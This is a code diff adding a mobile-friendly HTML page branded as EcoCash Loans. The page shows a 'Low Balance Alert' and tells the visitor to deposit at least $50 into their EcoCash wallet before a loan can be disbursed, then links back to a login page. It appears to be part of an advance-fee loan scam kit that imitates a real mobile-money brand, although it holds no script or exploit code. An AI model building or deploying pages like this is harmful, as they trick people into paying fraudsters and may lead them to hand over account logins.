@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+  <title>EcoCash – Low Balance Alert</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', Arial, Helvetica, sans-serif;
+      background: #e5e5e5;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 400px;
+      margin: auto;
+      background: white;
+      border-radius: 28px;
+      overflow: hidden;
+      box-shadow: 0 12px 48px rgba(0, 0, 0, 0.08);
+      position: relative;
+    }
+
+    /* EcoCash top accent (soft blue/red gradient) */
+    .top-accent {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 6px;
+      background: linear-gradient(90deg, #1c6aa6 0%, #e12b2b 100%);
+      z-index: 1;
+    }
+
+    .main-content {
+      padding: 32px 24px 40px;
+      text-align: center;
+    }
+
+    /* Logo – exactly like login */
+    .logo {
+      font-size: 38px;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+    .logo span:first-child { color: #1c6aa6; }
+    .logo span:last-child { color: #e12b2b; }
+
+    /* Alert icon */
+    .alert-icon {
+      background: #fff5f5;
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 24px;
+      border: 1px solid #ffe0e0;
+    }
+    .alert-icon i {
+      font-size: 44px;
+      color: #e12b2b;
+    }
+
+    /* Title */
+    .alert-title {
+      font-size: 28px;
+      font-weight: 800;
+      color: #e12b2b;
+      margin-bottom: 12px;
+      letter-spacing: -0.3px;
+    }
+
+    /* Minimum amount – same style as loan amount on landing */
+    .minimum-amount {
+      font-size: 36px;
+      font-weight: 800;
+      color: #1c6aa6;
+      background: #f0f7fe;
+      display: inline-block;
+      padding: 8px 24px;
+      border-radius: 60px;
+      margin: 16px 0 20px;
+      letter-spacing: -0.5px;
+    }
+
+    .message-text {
+      font-size: 15px;
+      color: #666;
+      line-height: 1.5;
+      margin-bottom: 32px;
+    }
+
+    .message-text strong {
+      color: #1c6aa6;
+      font-weight: 700;
+    }
+
+    /* Button – same blue gradient as other pages */
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(90deg, #1c6aa6, #0e4a73);
+      color: white;
+      border: none;
+      border-radius: 60px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      text-decoration: none;
+      text-align: center;
+      transition: 0.2s;
+      box-shadow: 0 6px 16px rgba(28, 106, 166, 0.25);
+    }
+
+    .btn:active {
+      transform: scale(0.98);
+    }
+
+    /* Bottom note */
+    .bottom-note {
+      margin-top: 28px;
+      font-size: 12px;
+      color: #aaa;
+      text-align: center;
+      border-top: 1px solid #f0f0f0;
+      padding-top: 20px;
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+  <div class="top-accent"></div>
+  <div class="main-content">
+    <div class="logo">
+      <span>Eco</span><span>Cash</span>
+    </div>
+
+    <div class="alert-icon">
+      <i class="fas fa-exclamation-triangle"></i>
+    </div>
+
+    <div class="alert-title">Low Balance Alert</div>
+
+    <div class="minimum-amount">Minimum $50</div>
+
+    <div class="message-text">
+      Your account balance is too low to qualify for a loan disbursement.<br><br>
+      Please deposit at least <strong>$50</strong> to your EcoCash wallet, then try again.
+    </div>
+
+    <a href="login.html" class="btn">Try Again After Deposit</a>
+
+    <div class="bottom-note">
+      v3.0.3P • EcoCash Loans
+    </div>
+  </div>
+</div>
+</body>
+</html>
